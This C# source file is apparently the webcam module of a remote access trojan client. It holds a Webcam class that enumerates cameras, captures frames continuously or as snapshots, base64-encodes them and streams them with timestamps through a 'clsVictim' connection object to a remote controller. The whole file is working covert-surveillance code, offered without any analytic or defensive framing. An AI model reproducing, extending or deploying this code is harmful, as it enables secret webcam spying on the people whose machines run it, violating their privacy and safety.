using AForge.Video.DirectShow;
using AForge.Video;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    internal class Webcam
    {
        private FilterInfoCollection videoDevices;
        public VideoCaptureDevice videoSource;
        private Bitmap currentFrame;
        public bool stop_capture = false;
        public bool is_stopped = true;
        public bool snapshot = false;
        public bool monitor = false;
        public int nDelay { get; set; } = 100;
        public clsVictim v;

        public List<string> GetDevices()
        {
            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            List<string> device_list = new List<string>();
            if (videoDevices.Count > 0)
                for (int i = 0; i < videoDevices.Count; i++)
                    device_list.Add(videoDevices[i].Name);

            return device_list;
        }
        public void StartCapture(int index)
        {
            // Get available video devices
            videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (videoDevices.Count == 0)
            {
                Console.WriteLine("No video capture devices found.");
                return;
            }

            // Use the first available video device
            videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += new NewFrameEventHandler(videoSource_NewFrame);

            // Start capturing
            is_stopped = false;
            videoSource.Start();

            while (!stop_capture)
                Thread.Sleep(10);

            // Wait for user input to stop
            videoSource.SignalToStop();
            videoSource.WaitForStop();
            is_stopped = true;
        }
        private void videoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            // Save the current frame as a Bitmap
            currentFrame = (Bitmap)eventArgs.Frame.Clone();

            // Save the image to disk
            //SaveImage("captured_image.jpg");

            // Convert the image to Base64 and print it
            string base64Image = ConvertImageToBase64(currentFrame);

            if (v != null)
            {
                v.encSend(2, 0, $"{(monitor ? "mulcam" : "webcam")}|start|" + base64Image + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            }

            stop_capture = snapshot;

            Thread.Sleep(nDelay);
        }
        private void SaveImage(string filePath)
        {
            // Save the captured frame (currentFrame) to a file
            if (currentFrame != null)
            {
                currentFrame.Save(filePath, System.Drawing.Imaging.ImageFormat.Jpeg);
                Console.WriteLine($"Image saved to {filePath}");
            }
        }

        public void Close()
        {
            try
            {
                videoSource.SignalToStop();
                videoSource.WaitForStop();
                is_stopped = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// Convert image into base-64 string.
        /// </summary>
        /// <param name="image">Image</param>
        /// <returns></returns>
        private string ConvertImageToBase64(Bitmap image)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                // Save the image to the memory stream in JPEG format
                image.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);

                // Convert the memory stream to a byte array
                byte[] imageBytes = ms.ToArray();

                // Convert the byte array to a Base64 string
                return Convert.ToBase64String(imageBytes);
            }
        }
    }
}
